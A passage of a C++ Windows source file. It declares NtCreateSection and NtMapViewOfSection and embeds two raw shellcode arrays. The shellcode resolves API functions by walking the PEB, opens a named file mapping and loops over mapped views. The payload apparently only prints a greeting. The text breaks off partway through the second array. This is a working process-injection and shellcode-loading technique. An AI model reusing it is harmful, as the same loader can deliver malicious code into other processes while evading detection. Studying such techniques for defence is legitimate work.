#include <Windows.h>
#include <stdio.h>
#include <stdint.h>
#include <winternl.h>
#include <codecvt>
#include <iostream>
#include <vector>
#include <map>
#include <psapi.h>
#include <tlhelp32.h>
#include <processthreadsapi.h>

typedef LONG(__stdcall* NtCreateSection_t)(HANDLE*, ULONG, void*, LARGE_INTEGER*, ULONG, ULONG, HANDLE);
typedef LONG(__stdcall* NtMapViewOfSection_t)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);

typedef void(__stdcall* MyRtlInitUnicodeString)(
	IN PUNICODE_STRING DestinationString,
	IN __drv_aliasesMem PCWSTR SourceString
	);

MyRtlInitUnicodeString RtlInitUnicodeString2;
NtCreateSection_t NtCreateSection;
NtMapViewOfSection_t NtMapViewOfSection;


int32_t wmain(int32_t nArgc, const wchar_t* pArgv[]) {

	unsigned char controller_buf[] =
		"\x56\x48\x8B\xF4\x48\x83\xE4\xF0\x48\x83\xEC\x20\xE8\x2F\x00\x00"
		"\x00\x48\x8B\xE6\x5E\xC3\x4C\x6F\x61\x64\x4C\x69\x62\x72\x61\x72"
		"\x79\x41\x00\x00\x00\x00\x6B\x00\x65\x00\x72\x00\x6E\x00\x65\x00"
		"\x6C\x00\x33\x00\x32\x00\x2E\x00\x64\x00\x6C\x00\x6C\x00\x00\x00"
		"\x48\x81\xEC\x88\x01\x00\x00\xB8\x6B\x00\x00\x00\x66\x89\x84\x24"
		"\xD8\x00\x00\x00\xB8\x65\x00\x00\x00\x66\x89\x84\x24\xDA\x00\x00"
		"\x00\xB8\x72\x00\x00\x00\x66\x89\x84\x24\xDC\x00\x00\x00\xB8\x6E"
		"\x00\x00\x00\x66\x89\x84\x24\xDE\x00\x00\x00\xB8\x65\x00\x00\x00"
		"\x66\x89\x84\x24\xE0\x00\x00\x00\xB8\x6C\x00\x00\x00\x66\x89\x84"
		"\x24\xE2\x00\x00\x00\xB8\x33\x00\x00\x00\x66\x89\x84\x24\xE4\x00"
		"\x00\x00\xB8\x32\x00\x00\x00\x66\x89\x84\x24\xE6\x00\x00\x00\xB8"
		"\x2E\x00\x00\x00\x66\x89\x84\x24\xE8\x00\x00\x00\xB8\x64\x00\x00"
		"\x00\x66\x89\x84\x24\xEA\x00\x00\x00\xB8\x6C\x00\x00\x00\x66\x89"
		"\x84\x24\xEC\x00\x00\x00\xB8\x6C\x00\x00\x00\x66\x89\x84\x24\xEE"
		"\x00\x00\x00\x33\xC0\x66\x89\x84\x24\xF0\x00\x00\x00\xC6\x44\x24"
		"\x68\x4C\xC6\x44\x24\x69\x6F\xC6\x44\x24\x6A\x61\xC6\x44\x24\x6B"
		"\x64\xC6\x44\x24\x6C\x4C\xC6\x44\x24\x6D\x69\xC6\x44\x24\x6E\x62"
		"\xC6\x44\x24\x6F\x72\xC6\x44\x24\x70\x61\xC6\x44\x24\x71\x72\xC6"
		"\x44\x24\x72\x79\xC6\x44\x24\x73\x41\xC6\x44\x24\x74\x00\xC6\x84"
		"\x24\x88\x00\x00\x00\x47\xC6\x84\x24\x89\x00\x00\x00\x65\xC6\x84"
		"\x24\x8A\x00\x00\x00\x74\xC6\x84\x24\x8B\x00\x00\x00\x50\xC6\x84"
		"\x24\x8C\x00\x00\x00\x72\xC6\x84\x24\x8D\x00\x00\x00\x6F\xC6\x84"
		"\x24\x8E\x00\x00\x00\x63\xC6\x84\x24\x8F\x00\x00\x00\x41\xC6\x84"
		"\x24\x90\x00\x00\x00\x64\xC6\x84\x24\x91\x00\x00\x00\x64\xC6\x84"
		"\x24\x92\x00\x00\x00\x72\xC6\x84\x24\x93\x00\x00\x00\x65\xC6\x84"
		"\x24\x94\x00\x00\x00\x73\xC6\x84\x24\x95\x00\x00\x00\x73\xC6\x84"
		"\x24\x96\x00\x00\x00\x00\xC6\x44\x24\x48\x75\xC6\x44\x24\x49\x73"
		"\xC6\x44\x24\x4A\x65\xC6\x44\x24\x4B\x72\xC6\x44\x24\x4C\x33\xC6"
		"\x44\x24\x4D\x32\xC6\x44\x24\x4E\x2E\xC6\x44\x24\x4F\x64\xC6\x44"
		"\x24\x50\x6C\xC6\x44\x24\x51\x6C\xC6\x44\x24\x52\x00\xC6\x44\x24"
		"\x58\x4D\xC6\x44\x24\x59\x65\xC6\x44\x24\x5A\x73\xC6\x44\x24\x5B"
		"\x73\xC6\x44\x24\x5C\x61\xC6\x44\x24\x5D\x67\xC6\x44\x24\x5E\x65"
		"\xC6\x44\x24\x5F\x42\xC6\x44\x24\x60\x6F\xC6\x44\x24\x61\x78\xC6"
		"\x44\x24\x62\x57\xC6\x44\x24\x63\x00\xC6\x84\x24\xA8\x00\x00\x00"
		"\x4F\xC6\x84\x24\xA9\x00\x00\x00\x70\xC6\x84\x24\xAA\x00\x00\x00"
		"\x65\xC6\x84\x24\xAB\x00\x00\x00\x6E\xC6\x84\x24\xAC\x00\x00\x00"
		"\x46\xC6\x84\x24\xAD\x00\x00\x00\x69\xC6\x84\x24\xAE\x00\x00\x00"
		"\x6C\xC6\x84\x24\xAF\x00\x00\x00\x65\xC6\x84\x24\xB0\x00\x00\x00"
		"\x4D\xC6\x84\x24\xB1\x00\x00\x00\x61\xC6\x84\x24\xB2\x00\x00\x00"
		"\x70\xC6\x84\x24\xB3\x00\x00\x00\x70\xC6\x84\x24\xB4\x00\x00\x00"
		"\x69\xC6\x84\x24\xB5\x00\x00\x00\x6E\xC6\x84\x24\xB6\x00\x00\x00"
		"\x67\xC6\x84\x24\xB7\x00\x00\x00\x41\xC6\x84\x24\xB8\x00\x00\x00"
		"\x00\xC6\x44\x24\x78\x4D\xC6\x44\x24\x79\x61\xC6\x44\x24\x7A\x70"
		"\xC6\x44\x24\x7B\x56\xC6\x44\x24\x7C\x69\xC6\x44\x24\x7D\x65\xC6"
		"\x44\x24\x7E\x77\xC6\x44\x24\x7F\x4F\xC6\x84\x24\x80\x00\x00\x00"
		"\x66\xC6\x84\x24\x81\x00\x00\x00\x46\xC6\x84\x24\x82\x00\x00\x00"
		"\x69\xC6\x84\x24\x83\x00\x00\x00\x6C\xC6\x84\x24\x84\x00\x00\x00"
		"\x65\xC6\x84\x24\x85\x00\x00\x00\x00\xC6\x84\x24\x98\x00\x00\x00"
		"\x55\xC6\x84\x24\x99\x00\x00\x00\x6E\xC6\x84\x24\x9A\x00\x00\x00"
		"\x6D\xC6\x84\x24\x9B\x00\x00\x00\x61\xC6\x84\x24\x9C\x00\x00\x00"
		"\x70\xC6\x84\x24\x9D\x00\x00\x00\x56\xC6\x84\x24\x9E\x00\x00\x00"
		"\x69\xC6\x84\x24\x9F\x00\x00\x00\x65\xC6\x84\x24\xA0\x00\x00\x00"
		"\x77\xC6\x84\x24\xA1\x00\x00\x00\x4F\xC6\x84\x24\xA2\x00\x00\x00"
		"\x66\xC6\x84\x24\xA3\x00\x00\x00\x46\xC6\x84\x24\xA4\x00\x00\x00"
		"\x69\xC6\x84\x24\xA5\x00\x00\x00\x6C\xC6\x84\x24\xA6\x00\x00\x00"
		"\x65\xC6\x84\x24\xA7\x00\x00\x00\x00\xC6\x44\x24\x40\x53\xC6\x44"
		"\x24\x41\x6C\xC6\x44\x24\x42\x65\xC6\x44\x24\x43\x65\xC6\x44\x24"
		"\x44\x70\xC6\x44\x24\x45\x00\xC6\x44\x24\x30\x4C\xC6\x44\x24\x31"
		"\x6F\xC6\x44\x24\x32\x63\xC6\x44\x24\x33\x61\xC6\x44\x24\x34\x6C"
		"\xC6\x44\x24\x35\x5C\xC6\x44\x24\x36\x4D\xC6\x44\x24\x37\x79\xC6"
		"\x44\x24\x38\x00\xB8\x48\x00\x00\x00\x66\x89\x84\x24\x10\x01\x00"
		"\x00\xB8\x65\x00\x00\x00\x66\x89\x84\x24\x12\x01\x00\x00\xB8\x6C"
		"\x00\x00\x00\x66\x89\x84\x24\x14\x01\x00\x00\xB8\x6C\x00\x00\x00"
		"\x66\x89\x84\x24\x16\x01\x00\x00\xB8\x6F\x00\x00\x00\x66\x89\x84"
		"\x24\x18\x01\x00\x00\xB8\x20\x00\x00\x00\x66\x89\x84\x24\x1A\x01"
		"\x00\x00\xB8\x57\x00\x00\x00\x66\x89\x84\x24\x1C\x01\x00\x00\xB8"
		"\x6F\x00\x00\x00\x66\x89\x84\x24\x1E\x01\x00\x00\xB8\x72\x00\x00"
		"\x00\x66\x89\x84\x24\x20\x01\x00\x00\xB8\x6C\x00\x00\x00\x66\x89"
		"\x84\x24\x22\x01\x00\x00\xB8\x64\x00\x00\x00\x66\x89\x84\x24\x24"
		"\x01\x00\x00\xB8\x21\x00\x00\x00\x66\x89\x84\x24\x26\x01\x00\x00"
		"\x33\xC0\x66\x89\x84\x24\x28\x01\x00\x00\xB8\x44\x00\x00\x00\x66"
		"\x89\x84\x24\x00\x01\x00\x00\xB8\x65\x00\x00\x00\x66\x89\x84\x24"
		"\x02\x01\x00\x00\xB8\x6D\x00\x00\x00\x66\x89\x84\x24\x04\x01\x00"
		"\x00\xB8\x6F\x00\x00\x00\x66\x89\x84\x24\x06\x01\x00\x00\xB8\x21"
		"\x00\x00\x00\x66\x89\x84\x24\x08\x01\x00\x00\x33\xC0\x66\x89\x84"
		"\x24\x0A\x01\x00\x00\x48\x8D\x8C\x24\xD8\x00\x00\x00\xE8\x74\x04"
		"\x00\x00\x48\x89\x84\x24\xC0\x00\x00\x00\x48\x83\xBC\x24\xC0\x00"
		"\x00\x00\x00\x75\x0A\xB8\x01\x00\x00\x00\xE9\x17\x02\x00\x00\x48"
		"\x8D\x54\x24\x68\x48\x8B\x8C\x24\xC0\x00\x00\x00\xE8\x0D\x02\x00"
		"\x00\x48\x89\x84\x24\x30\x01\x00\x00\x48\x83\xBC\x24\x30\x01\x00"
		"\x00\x00\x75\x0A\xB8\x02\x00\x00\x00\xE9\xE8\x01\x00\x00\x48\x8D"
		"\x94\x24\x88\x00\x00\x00\x48\x8B\x8C\x24\xC0\x00\x00\x00\xE8\xDB"
		"\x01\x00\x00\x48\x89\x84\x24\x38\x01\x00\x00\x48\x83\xBC\x24\x38"
		"\x01\x00\x00\x00\x75\x0A\xB8\x03\x00\x00\x00\xE9\xB6\x01\x00\x00"
		"\x48\x8B\x84\x24\x30\x01\x00\x00\x48\x89\x84\x24\x58\x01\x00\x00"
		"\x48\x8B\x84\x24\x38\x01\x00\x00\x48\x89\x84\x24\xC8\x00\x00\x00"
		"\x48\x8D\x4C\x24\x48\xFF\x94\x24\x58\x01\x00\x00\x48\x89\x84\x24"
		"\x60\x01\x00\x00\x48\x8D\x54\x24\x58\x48\x8B\x8C\x24\x60\x01\x00"
		"\x00\xFF\x94\x24\xC8\x00\x00\x00\x48\x89\x84\x24\x40\x01\x00\x00"
		"\x48\x83\xBC\x24\x40\x01\x00\x00\x00\x75\x0A\xB8\x04\x00\x00\x00"
		"\xE9\x51\x01\x00\x00\x48\x8D\x94\x24\xA8\x00\x00\x00\x48\x8B\x8C"
		"\x24\xC0\x00\x00\x00\xFF\x94\x24\xC8\x00\x00\x00\x48\x89\x84\x24"
		"\x48\x01\x00\x00\x48\x8D\x54\x24\x78\x48\x8B\x8C\x24\xC0\x00\x00"
		"\x00\xFF\x94\x24\xC8\x00\x00\x00\x48\x89\x84\x24\x50\x01\x00\x00"
		"\x48\x8D\x94\x24\x98\x00\x00\x00\x48\x8B\x8C\x24\xC0\x00\x00\x00"
		"\xFF\x94\x24\xC8\x00\x00\x00\x48\x89\x84\x24\x68\x01\x00\x00\x48"
		"\x8D\x54\x24\x40\x48\x8B\x8C\x24\xC0\x00\x00\x00\xFF\x94\x24\xC8"
		"\x00\x00\x00\x48\x89\x84\x24\x70\x01\x00\x00\x48\x83\xBC\x24\x40"
		"\x01\x00\x00\x00\x75\x0A\xB8\x04\x00\x00\x00\xE9\xC6\x00\x00\x00"
		"\x4C\x8D\x44\x24\x30\xBA\x01\x00\x00\x00\xB9\x3F\x00\x0F\x00\xFF"
		"\x94\x24\x48\x01\x00\x00\x48\x89\x84\x24\xF8\x00\x00\x00\x48\xC7"
		"\x44\x24\x20\x00\x20\x00\x00\x45\x33\xC9\x45\x33\xC0\xBA\x3F\x00"
		"\x0F\x00\x48\x8B\x8C\x24\xF8\x00\x00\x00\xFF\x94\x24\x50\x01\x00"
		"\x00\x48\x89\x84\x24\xD0\x00\x00\x00\xFF\x94\x24\xD0\x00\x00\x00"
		"\x33\xC0\x83\xF8\x01\x74\x6D\x48\x8B\x8C\x24\xD0\x00\x00\x00\xFF"
		"\x94\x24\x68\x01\x00\x00\xB9\x30\x75\x00\x00\xFF\x94\x24\x70\x01"
		"\x00\x00\x4C\x8D\x44\x24\x30\xBA\x01\x00\x00\x00\xB9\x3F\x00\x0F"
		"\x00\xFF\x94\x24\x48\x01\x00\x00\x48\x89\x84\x24\xF8\x00\x00\x00"
		"\x48\xC7\x44\x24\x20\x00\x20\x00\x00\x45\x33\xC9\x45\x33\xC0\xBA"
		"\x3F\x00\x0F\x00\x48\x8B\x8C\x24\xF8\x00\x00\x00\xFF\x94\x24\x50"
		"\x01\x00\x00\x48\x89\x84\x24\xD0\x00\x00\x00\xFF\x94\x24\xD0\x00"
		"\x00\x00\xEB\x8C\x33\xC0\x48\x81\xC4\x88\x01\x00\x00\xC3\x48\x89"
		"\x54\x24\x10\x48\x89\x4C\x24\x08\x48\x83\xEC\x78\x48\x8B\x84\x24"
		"\x80\x00\x00\x00\x48\x89\x44\x24\x30\x48\x8B\x44\x24\x30\x0F\xB7"
		"\x00\x3D\x4D\x5A\x00\x00\x74\x07\x33\xC0\xE9\x02\x02\x00\x00\x48"
		"\x8B\x44\x24\x30\x48\x63\x40\x3C\x48\x8B\x8C\x24\x80\x00\x00\x00"
		"\x48\x03\xC8\x48\x8B\xC1\x48\x89\x44\x24\x40\xB8\x08\x00\x00\x00"
		"\x48\x6B\xC0\x00\x48\x8B\x4C\x24\x40\x48\x8D\x84\x01\x88\x00\x00"
		"\x00\x48\x89\x44\x24\x38\x48\x8B\x44\x24\x38\x83\x38\x00\x75\x07"
		"\x33\xC0\xE9\xBA\x01\x00\x00\x48\x8B\x44\x24\x38\x8B\x00\x89\x44"
		"\x24\x18\x8B\x44\x24\x18\x48\x03\x84\x24\x80\x00\x00\x00\x48\x89"
		"\x44\x24\x10\x48\x8B\x44\x24\x10\x8B\x40\x18\x48\x89\x44\x24\x48"
		"\x48\x8B\x44\x24\x10\x8B\x40\x1C\x89\x44\x24\x24\x48\x8B\x44\x24"
		"\x10\x8B\x40\x20\x89\x44\x24\x1C\x48\x8B\x44\x24\x10\x8B\x40\x24"
		"\x89\x44\x24\x20\x48\xC7\x44\x24\x08\x00\x00\x00\x00\xEB\x0D\x48"
		"\x8B\x44\x24\x08\x48\xFF\xC0\x48\x89\x44\x24\x08\x48\x8B\x44\x24"
		"\x48\x48\x39\x44\x24\x08\x0F\x83\x43\x01\x00\x00\x8B\x44\x24\x1C"
		"\x48\x8B\x8C\x24\x80\x00\x00\x00\x48\x03\xC8\x48\x8B\xC1\x48\x8B"
		"\x4C\x24\x08\x48\x8D\x04\x88\x48\x89\x44\x24\x58\x8B\x44\x24\x20"
		"\x48\x8B\x8C\x24\x80\x00\x00\x00\x48\x03\xC8\x48\x8B\xC1\x48\x8B"
		"\x4C\x24\x08\x48\x8D\x04\x48\x48\x89\x44\x24\x50\x8B\x44\x24\x24"
		"\x48\x8B\x8C\x24\x80\x00\x00\x00\x48\x03\xC8\x48\x8B\xC1\x48\x8B"
		"\x4C\x24\x50\x0F\xB7\x09\x48\x8D\x04\x88\x48\x89\x44\x24\x60\x48"
		"\x8B\x44\x24\x58\x8B\x00\x48\x8B\x8C\x24\x80\x00\x00\x00\x48\x03"
		"\xC8\x48\x8B\xC1\x48\x89\x44\x24\x28\x48\xC7\x04\x24\x00\x00\x00"
		"\x00\x48\xC7\x04\x24\x00\x00\x00\x00\xEB\x0B\x48\x8B\x04\x24\x48"
		"\xFF\xC0\x48\x89\x04\x24\x48\x8B\x04\x24\x48\x8B\x8C\x24\x88\x00"
		"\x00\x00\x48\x03\xC8\x48\x8B\xC1\x0F\xBE\x00\x85\xC0\x74\x45\x48"
		"\x8B\x04\x24\x48\x8B\x4C\x24\x28\x48\x03\xC8\x48\x8B\xC1\x0F\xBE"
		"\x00\x85\xC0\x74\x2F\x48\x8B\x04\x24\x48\x8B\x8C\x24\x88\x00\x00"
		"\x00\x48\x03\xC8\x48\x8B\xC1\x0F\xBE\x00\x48\x8B\x0C\x24\x48\x8B"
		"\x54\x24\x28\x48\x03\xD1\x48\x8B\xCA\x0F\xBE\x09\x3B\xC1\x74\x02"
		"\xEB\x02\xEB\x97\x48\x8B\x04\x24\x48\x8B\x8C\x24\x88\x00\x00\x00"
		"\x48\x03\xC8\x48\x8B\xC1\x0F\xBE\x00\x85\xC0\x75\x2D\x48\x8B\x04"
		"\x24\x48\x8B\x4C\x24\x28\x48\x03\xC8\x48\x8B\xC1\x0F\xBE\x00\x85"
		"\xC0\x75\x17\x48\x8B\x44\x24\x60\x8B\x00\x48\x8B\x8C\x24\x80\x00"
		"\x00\x00\x48\x03\xC8\x48\x8B\xC1\xEB\x07\xE9\xA0\xFE\xFF\xFF\x33"
		"\xC0\x48\x83\xC4\x78\xC3\x48\x89\x4C\x24\x08\x56\x57\x48\x83\xEC"
		"\x68\x48\xC7\x44\x24\x30\x00\x00\x00\x00\x65\x48\x8B\x04\x25\x60"
		"\x00\x00\x00\x48\x89\x44\x24\x30\x48\x8B\x44\x24\x30\x48\x8B\x40"
		"\x18\x48\x89\x44\x24\x38\x48\x8D\x44\x24\x48\x48\x8B\x4C\x24\x38"
		"\x48\x8B\xF8\x48\x8D\x71\x10\xB9\x10\x00\x00\x00\xF3\xA4\x48\x8B"
		"\x44\x24\x48\x48\x89\x44\x24\x40\x48\x8B\x44\x24\x40\x48\x89\x44"
		"\x24\x20\x48\x83\x7C\x24\x20\x00\x0F\x84\xC6\x01\x00\x00\x48\x8B"
		"\x44\x24\x20\x48\x83\x78\x30\x00\x0F\x84\xB6\x01\x00\x00\x48\x8B"
		"\x44\x24\x20\x48\x83\x78\x60\x00\x75\x02\xEB\xD6\x48\x8B\x44\x24"
		"\x20\x48\x8B\x40\x60\x48\x89\x44\x24\x18\x48\xC7\x04\x24\x00\x00"
		"\x00\x00\x48\xC7\x04\x24\x00\x00\x00\x00\xEB\x0B\x48\x8B\x04\x24"
		"\x48\xFF\xC0\x48\x89\x04\x24\x48\x8B\x84\x24\x80\x00\x00\x00\x48"
		"\x8B\x0C\x24\x0F\xB7\x04\x48\x85\xC0\x0F\x84\x23\x01\x00\x00\x48"
		"\x8B\x44\x24\x18\x48\x8B\x0C\x24\x0F\xB7\x04\x48\x85\xC0\x0F\x84"
		"\x0E\x01\x00\x00\x48\x8B\x84\x24\x80\x00\x00\x00\x48\x8B\x0C\x24"
		"\x0F\xB7\x04\x48\x83\xF8\x5A\x7F\x50\x48\x8B\x84\x24\x80\x00\x00"
		"\x00\x48\x8B\x0C\x24\x0F\xB7\x04\x48\x83\xF8\x41\x7C\x3B\x48\x8B"
		"\x84\x24\x80\x00\x00\x00\x48\x8B\x0C\x24\x0F\xB7\x04\x48\x83\xE8"
		"\x41\x83\xC0\x61\x89\x44\x24\x28\x48\x8B\x84\x24\x80\x00\x00\x00"
		"\x48\x8B\x0C\x24\x0F\xB7\x54\x24\x28\x66\x89\x14\x48\x0F\xB7\x44"
		"\x24\x28\x66\x89\x44\x24\x08\xEB\x15\x48\x8B\x84\x24\x80\x00\x00"
		"\x00\x48\x8B\x0C\x24\x0F\xB7\x04\x48\x66\x89\x44\x24\x08\x0F\xB7"
		"\x44\x24\x08\x66\x89\x44\x24\x0C\x48\x8B\x44\x24\x18\x48\x8B\x0C"
		"\x24\x0F\xB7\x04\x48\x83\xF8\x5A\x7F\x47\x48\x8B\x44\x24\x18\x48"
		"\x8B\x0C\x24\x0F\xB7\x04\x48\x83\xF8\x41\x7C\x35\x48\x8B\x44\x24"
		"\x18\x48\x8B\x0C\x24\x0F\xB7\x04\x48\x83\xE8\x41\x83\xC0\x61\x89"
		"\x44\x24\x2C\x48\x8B\x44\x24\x18\x48\x8B\x0C\x24\x0F\xB7\x54\x24"
		"\x2C\x66\x89\x14\x48\x0F\xB7\x44\x24\x2C\x66\x89\x44\x24\x0A\xEB"
		"\x12\x48\x8B\x44\x24\x18\x48\x8B\x0C\x24\x0F\xB7\x04\x48\x66\x89"
		"\x44\x24\x0A\x0F\xB7\x44\x24\x0A\x66\x89\x44\x24\x10\x0F\xB7\x44"
		"\x24\x0C\x0F\xB7\x4C\x24\x10\x3B\xC1\x74\x02\xEB\x05\xE9\xBA\xFE"
		"\xFF\xFF\x48\x8B\x84\x24\x80\x00\x00\x00\x48\x8B\x0C\x24\x0F\xB7"
		"\x04\x48\x85\xC0\x75\x1C\x48\x8B\x44\x24\x18\x48\x8B\x0C\x24\x0F"
		"\xB7\x04\x48\x85\xC0\x75\x0B\x48\x8B\x44\x24\x20\x48\x8B\x40\x30"
		"\xEB\x14\x48\x8B\x44\x24\x20\x48\x8B\x00\x48\x89\x44\x24\x20\xE9"
		"\x2E\xFE\xFF\xFF\x33\xC0\x48\x83\xC4\x68\x5F\x5E\xC3\x00\x00\x00";

	uint32_t controller_size = sizeof controller_buf;


	unsigned char payload_buf[] =
		"\x56\x48\x8B\xF4\x48\x83\xE4\xF0\x48\x83\xEC\x20\xE8\x2F\x00\x00"
		"\x00\x48\x8B\xE6\x5E\xC3\x4C\x6F\x61\x64\x4C\x69\x62\x72\x61\x72"
		"\x79\x41\x00\x00\x00\x00\x6B\x00\x65\x00\x72\x00\x6E\x00\x65\x00"
		"\x6C\x00\x33\x00\x32\x00\x2E\x00\x64\x00\x6C\x00\x6C\x00\x00\x00"
		"\x48\x81\xEC\xD8\x01\x00\x00\xB8\x6B\x00\x00\x00\x66\x89\x84\x24"
		"\x68\x01\x00\x00\xB8\x65\x00\x00\x00\x66\x89\x84\x24\x6A\x01\x00"
		"\x00\xB8\x72\x00\x00\x00\x66\x89\x84\x24\x6C\x01\x00\x00\xB8\x6E"
		"\x00\x00\x00\x66\x89\x84\x24\x6E\x01\x00\x00\xB8\x65\x00\x00\x00"
		"\x66\x89\x84\x24\x70\x01\x00\x00\xB8\x6C\x00\x00\x00\x66\x89\x84"
		"\x24\x72\x01\x00\x00\xB8\x33\x00\x00\x00\x66\x89\x84\x24\x74\x01"
		"\x00\x00\xB8\x32\x00\x00\x00\x66\x89\x84\x24\x76\x01\x00\x00\xB8"
		"\x2E\x00\x00\x00\x66\x89\x84\x24\x78\x01\x00\x00\xB8\x64\x00\x00"
		"\x00\x66\x89\x84\x24\x7A\x01\x00\x00\xB8\x6C\x00\x00\x00\x66\x89"
		"\x84\x24\x7C\x01\x00\x00\xB8\x6C\x00\x00\x00\x66\x89\x84\x24\x7E"
		"\x01\x00\x00\x33\xC0\x66\x89\x84\x24\x80\x01\x00\x00\xC6\x44\x24"
		"\x50\x4C\xC6\x44\x24\x51\x6F\xC6\x44\x24\x52\x61\xC6\x44\x24\x53"
		"\x64\xC6\x44\x24\x54\x4C\xC6\x44\x24\x55\x69\xC6\x44\x24\x56\x62"
		"\xC6\x44\x24\x57\x72\xC6\x44\x24\x58\x61\xC6\x44\x24\x59\x72\xC6"
		"\x44\x24\x5A\x79\xC6\x44\x24\x5B\x41\xC6\x44\x24\x5C\x00\xC6\x84"
		"\x24\x90\x00\x00\x00\x47\xC6\x84\x24\x91\x00\x00\x00\x65\xC6\x84"
		"\x24\x92\x00\x00\x00\x74\xC6\x84\x24\x93\x00\x00\x00\x50\xC6\x84"
		"\x24\x94\x00\x00\x00\x72\xC6\x84\x24\x95\x00\x00\x00\x6F\xC6\x84"
		"\x24\x96\x00\x00\x00\x63\xC6\x84\x24\x97\x00\x00\x00\x41\xC6\x84"
		"\x24\x98\x00\x00\x00\x64\xC6\x84\x24\x99\x00\x00\x00\x64\xC6\x84"
		"\x24\x9A\x00\x00\x00\x72\xC6\x84\x24\x9B\x00\x00\x00\x65\xC6\x84"
		"\x24\x9C\x00\x00\x00\x73\xC6\x84\x24\x9D\x00\x00\x00\x73\xC6\x84"
		"\x24\x9E\x00\x00\x00\x00\xC6\x44\x24\x40\x75\xC6\x44\x24\x41\x73"
		"\xC6\x44\x24\x42\x65\xC6\x44\x24\x43\x72\xC6\x44\x24\x44\x33\xC6"
		"\x44\x24\x45\x32\xC6\x44\x24\x46\x2E\xC6\x44\x24\x47\x64\xC6\x44"
		"\x24\x48\x6C\xC6\x44\x24\x49\x6C\xC6\x44\x24\x4A\x00\xC6\x84\x24"
		"\x48\x01\x00\x00\x4F\xC6\x84\x24\x49\x01\x00\x00\x70\xC6\x84\x24"
		"\x4A\x01\x00\x00\x65\xC6\x84\x24\x4B\x01\x00\x00\x6E\xC6\x84\x24"
		"\x4C\x01\x00\x00\x46\xC6\x84\x24\x4D\x01\x00\x00\x69\xC6\x84\x24"
		"\x4E\x01\x00\x00\x6C\xC6\x84\x24\x4F\x01\x00\x00\x65\xC6\x84\x24"
		"\x50\x01\x00\x00\x4D\xC6\x84\x24\x51\x01\x00\x00\x61\xC6\x84\x24"
		"\x52\x01\x00\x00\x70\xC6\x84\x24\x53\x01\x00\x00\x70\xC6\x84\x24"
		"\x54\x01\x00\x00\x69\xC6\x84\x24\x55\x01\x00\x00\x6E\xC6\x84\x24"
		"\x56\x01\x00\x00\x67\xC6\x84\x24\x57\x01\x00\x00\x41\xC6\x84\x24"
		"\x58\x01\x00\x00\x00\xC6\x84\x24\x38\x01\x00\x00\x4D\xC6\x84\x24"
		"\x39\x01\x00\x00\x61\xC6\x84\x24\x3A\x01\x00\x00\x70\xC6\x84\x24"
		"\x3B\x01\x00\x00\x56\xC6\x84\x24\x3C\x01\x00\x00\x69\xC6\x84\x24"
		"\x3D\x01\x00\x00\x65\xC6\x84\x24\x3E\x01\x00\x00\x77\xC6\x84\x24"
		"\x3F\x01\x00\x00\x4F\xC6\x84\x24\x40\x01\x00\x00\x66\xC6\x84\x24"
		"\x41\x01\x00\x00\x46\xC6\x84\x24\x42\x01\x00\x00\x69\xC6\x84\x24"
		"\x43\x01\x00\x00\x6C\xC6\x84\x24\x44\x01\x00\x00\x65\xC6\x84\x24"
		"\x45\x01\x00\x00\x00\xC6\x44\x24\x60\x47\xC6\x44\x24\x61\x65\xC6"
		"\x44\x24\x62\x74\xC6\x44\x24\x63\x53\xC6\x44\x24\x64\x74\xC6\x44"
		"\x24\x65\x64\xC6\x44\x24\x66\x48\xC6\x44\x24\x67\x61\xC6\x44\x24"
		"\x68\x6E\xC6\x44\x24\x69\x64\xC6\x44\x24\x6A\x6C\xC6\x44\x24\x6B"
		"\x65\xC6\x44\x24\x6C\x00\xC6\x44\x24\x70\x41\xC6\x44\x24\x71\x74"
		"\xC6\x44\x24\x72\x74\xC6\x44\x24\x73\x61\xC6\x44\x24\x74\x63\xC6"
		"\x44\x24\x75\x68\xC6\x44\x24\x76\x43\xC6\x44\x24\x77\x6F\xC6\x44"
		"\x24\x78\x6E\xC6\x44\x24\x79\x73\xC6\x44\x24\x7A\x6F\xC6\x44\x24"
		"\x7B\x6C\xC6\x44\x24\x7C\x65\xC6\x44\x24\x7D\x00\xC6\x84\x24\x80"
		"\x00\x00\x00\x57\xC6\x84\x24\x81\x00\x00\x00\x72\xC6\x84\x24\x82"
		"\x00\x00\x00\x69\xC6\x84\x24\x83\x00\x00\x00\x74\xC6\x84\x24\x84"
		"\x00\x00\x00\x65\xC6\x84\x24\x85\x00\x00\x00\x43\xC6\x84\x24\x86"
		"\x00\x00\x00\x6F\xC6\x84\x24\x87\x00\x00\x00\x6E\xC6\x84\x24\x88"
		"\x00\x00\x00\x73\xC6\x84\x24\x89\x00\x00\x00\x6F\xC6\x84\x24\x8A"
		"\x00\x00\x00\x6C\xC6\x84\x24\x8B\x00\x00\x00\x65\xC6\x84\x24\x8C"
		"\x00\x00\x00\x41\xC6\x84\x24\x8D\x00\x00\x00\x00\xC6\x44\x24\x34"
		"\x53\xC6\x44\x24\x35\x6C\xC6\x44\x24\x36\x65\xC6\x44\x24\x37\x65"
		"\xC6\x44\x24\x38\x70\xC6\x44\x24\x39\x00\xC6\x84\x24\xF0\x00\x00"
		"\x00\x48\xC6\x84\x24\xF1\x00\x00\x00\x65\xC6\x84\x24\xF2\x00\x00"
		"\x00\x6C\xC6\x84\x24\xF3\x00\x00\x00\x6C\xC6\x84\x24\xF4\x00\x00"
		"\x00\x6F\xC6\x84\x24\xF5\x00\x00\x00\x20\xC6\x84\x24\xF6\x00\x00"
		"\x00\x66\xC6\x84\x24\xF7\x00\x00\x00\x72\xC6\x84\x24\xF8\x00\x00"
		"\x00\x6F\xC6\x84\x24\xF9\x00\x00\x00\x6D\xC6\x84\x24\xFA\x00\x00"
		"\x00\x20\xC6\x84\x24\xFB\x00\x00\x00\x6D\xC6\x84\x24\xFC\x00\x00"
		"\x00\x61\xC6\x84\x24\xFD\x00\x00\x00\x70\xC6\x84\x24\xFE\x00\x00"
		"\x00\x70\xC6\x84\x24\xFF\x00\x00\x00\x65\xC6\x84\x24\x00\x01\x00"
		"\x00\x64\xC6\x84\x24\x01\x01\x00\x00\x20\xC6\x84\x24\x02\x01\x00"
		"\x00\x73\xC6\x84\x24\x03\x01\x00\x00\x68\xC6\x84\x24\x04\x01\x00"
		"\x00\x65\xC6\x84\x24\x05\x01\x00\x00\x6C\xC6\x84\x24\x06\x01\x00"
		"\x00\x6C\xC6\x84\x24\x07\x01\x00\x00\x63\xC6\x84\x24\x08\x01\x00"
